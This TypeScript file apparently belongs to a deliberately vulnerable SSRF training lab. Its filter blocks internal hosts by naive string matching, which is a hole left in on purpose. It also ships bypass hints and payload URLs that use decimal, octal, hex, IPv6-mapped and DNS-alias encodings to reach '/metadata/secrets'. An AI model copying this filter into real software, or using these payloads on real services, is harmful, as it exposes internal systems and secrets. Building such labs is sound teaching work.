/**
 * 
 */

export interface FilterResult {
  blocked: boolean;
  reason?: string;
  bypassHints?: string[];
}

export class SsrfFilter {
  //
  private readonly blockedHosts = [
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '::1',
    '169.254.169.254', // AWS IMDS
  ];

  
  private readonly blockedPrefixes = [
    '10.',
    '172.16.', '172.17.', '172.18.', '172.19.',
    '172.20.', '172.21.', '172.22.', '172.23.',
    '172.24.', '172.25.', '172.26.', '172.27.',
    '172.28.', '172.29.', '172.30.', '172.31.',
    '192.168.',
  ];

  /**
   * Check if URL should be blocked (VULNERABLE: naive string matching)
   * VULNERABLE: Only checks literal string patterns, doesn't normalize IPs
   * Bypasses: IPv6-mapped, decimal, octal, hex encodings all bypass this filter
   */
  isBlocked(url: string): FilterResult {
    try {
      // VULNERABLE: Extract hostname naively without URL parser normalization
      // This allows decimal/octal/hex IPs to bypass the filter
      let hostname: string;
      
      // Extract hostname manually to avoid URL parser normalization
      // Handle IPv6 brackets: [::1] or regular hostnames
      const ipv6Match = url.match(/^https?:\/\/(\[[^\]]+\])/i);
      const regularMatch = url.match(/^https?:\/\/([^/:]+)/i);
      
      if (ipv6Match) {
        // IPv6 address with brackets
        hostname = ipv6Match[1].toLowerCase();
      } else if (regularMatch) {
        // Regular hostname or IPv4
        hostname = regularMatch[1].toLowerCase();
      } else {
        // Invalid URL format (no protocol or malformed)
        return {
          blocked: true,
          reason: 'Invalid URL format'
        };
      }

      // Strip brackets from IPv6 addresses for comparison
      const hostnameNoBrackets = hostname.replace(/^\[|\]$/g, '');

      // Check exact hostname matches (without brackets)
      if (this.blockedHosts.includes(hostnameNoBrackets)) {
        return {
          blocked: true,
          reason: `Blocked hostname: ${hostnameNoBrackets}`,
          bypassHints: this.getBypassHints()
        };
      }

      // Check IP prefix matches (only on the extracted string, not normalized)
      for (const prefix of this.blockedPrefixes) {
        if (hostname.startsWith(prefix)) {
          return {
          blocked: true,
            reason: `Private IP range: ${prefix}*`,
            bypassHints: this.getBypassHints()
          };
        }
      }

      // VULNERABLE: Allow anything that doesn't match literal string patterns
      // This means decimal (2130706433), octal (0177.0.0.1), hex (0x7f.0.0.1) all bypass!
      return { blocked: false };

    } catch (error) {
      return {
        blocked: true,
        reason: 'Invalid URL format'
      };
    }
  }

  /**
   * 
   */
  getBypassHints(): string[] {
    return [
      'Try IPv6 notation: http://[::ffff:127.0.0.1]:9090',
      'Try decimal IP encoding: http://2130706433:9090',
      'Try octal encoding: http://0177.0.0.1:9090',
      'Try hexadecimal: http://0x7f.0x0.0x0.0x1:9090',
      'Try DNS aliases: http://localtest.me:9090',
      'Try URL parser tricks with brackets',
      'Mix different encoding techniques'
    ];
  }

  /**
   * Get blocklist information (for debugging)
   */
  getBlocklist(): { hosts: string[]; prefixes: string[] } {
    return {
      hosts: [...this.blockedHosts],
      prefixes: [...this.blockedPrefixes]
    };
  }

  /**
   * Test if a specific bypass technique would work
   */
  testBypass(technique: string, targetHost: string = 'localhost', targetPort: number = 9090): {
    technique: string;
    url: string;
    blocked: boolean;
    description: string;
  } {
    let url: string;
    let description: string;

    switch (technique) {
      case 'ipv6':
        url = `http://[::ffff:127.0.0.1]:${targetPort}/metadata/secrets`;
        description = 'IPv6-mapped IPv4 address bypasses hostname filter';
        break;

      case 'decimal':
        // 127.0.0.1 = (127 * 16777216) + (0 * 65536) + (0 * 256) + 1 = 2130706433
        url = `http://2130706433:${targetPort}/metadata/secrets`;
        description = 'Decimal IP representation bypasses string matching';
        break;

      case 'octal':
        url = `http://0177.0.0.1:${targetPort}/metadata/secrets`;
        description = 'Octal notation bypasses literal IP checks';
        break;

      case 'hex':
        url = `http://0x7f.0x0.0x0.0x1:${targetPort}/metadata/secrets`;
        description = 'Hexadecimal notation bypasses filters';
        break;

      case 'mixed':
        url = `http://0x7f.0.0.1:${targetPort}/metadata/secrets`;
        description = 'Mixed hex/decimal notation';
        break;

      case 'dns':
        url = `http://localtest.me:${targetPort}/metadata/secrets`;
        description = 'DNS alias that resolves to 127.0.0.1';
        break;

      case 'subdomain':
        url = `http://localhost.evil.com:${targetPort}/metadata/secrets`;
        description = 'Subdomain trick (requires DNS setup)';
        break;

      default:
        url = `http://${targetHost}:${targetPort}/metadata/secrets`;
        description = 'Direct access (will be blocked)';
    }

    const result = this.isBlocked(url);

    return {
      technique,
      url,
      blocked: result.blocked,
      description
    };
  }

  /**
   * Get all bypass techniques with results
   */
  getAllBypasses(targetPort: number = 9090): Array<{
    technique: string;
    url: string;
    blocked: boolean;
    description: string;
  }> {
    const techniques = ['ipv6', 'decimal', 'octal', 'hex', 'mixed', 'dns', 'subdomain'];
    return techniques.map(tech => this.testBypass(tech, 'localhost', targetPort));
  }
}
